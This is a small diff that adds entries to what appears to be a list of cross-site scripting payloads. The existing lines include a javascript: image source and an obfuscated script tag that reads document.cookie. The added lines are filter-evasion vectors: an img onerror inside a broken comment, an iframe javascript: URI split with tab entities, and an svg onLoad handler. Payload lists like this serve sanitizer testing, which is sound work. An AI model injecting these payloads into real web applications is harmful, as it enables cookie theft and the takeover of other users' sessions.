@@ -7,3 +7,8 @@
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 
 <s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+<--<img/src=%20onerror=confirm``>%20--!>
+
+<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+
+<sVg/onLy=1 onLoaD=confirm(1)//
